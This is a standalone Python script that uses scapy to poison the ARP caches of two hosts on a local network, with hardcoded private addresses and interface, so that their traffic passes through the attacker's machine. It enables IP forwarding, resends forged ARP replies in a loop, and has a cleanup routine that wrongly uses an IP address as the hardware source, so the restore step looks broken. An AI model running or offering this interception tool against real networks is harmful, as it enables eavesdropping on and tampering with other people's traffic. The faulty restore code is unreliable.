#!/usr/bin/env python3
import sys, time
from scapy.all import ARP, Ether, srp, send, conf

conf.verb = 0

victim = "192.168.189.200"
target = "192.168.189.201"
iface = "ens224"

def get_mac(ip):
    req = ARP(pdst=ip)
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    rep = srp(eth / req, iface=iface, timeout=2, verbose=False)[0]
    return rep[0][1].hwsrc if rep else None

def poison(a, b, c):
    send(ARP(op=2, pdst=a, hwdst=b, psrc=c), verbose=False)

def restore(a, b, c):
    send(ARP(op=2, pdst=a, hwsrc=c, hwdst=b, psrc=c), count=5, verbose=False)

print("ARP Poisoning MITM")
print("Victim:", victim, "| Target:", target)
print("Interface:", iface)
vmac, tmac = get_mac(victim), get_mac(target)
if not vmac or not tmac: print("MAC not found"); sys.exit(1)
print("MACs:", vmac, tmac)
open("/proc/sys/net/ipv4/ip_forward", "w").write("1")
print("Go! Ctrl+C to stop")
try:
    i = 0
    while True:
        poison(victim, vmac, target)
        poison(target, tmac, victim)
        i += 1
        time.sleep(2)
except KeyboardInterrupt:
    restore(victim, vmac, target)
    restore(target, tmac, victim)
    open("/proc/sys/net/ipv4/ip_forward", "w").write("0")
    print("Done")
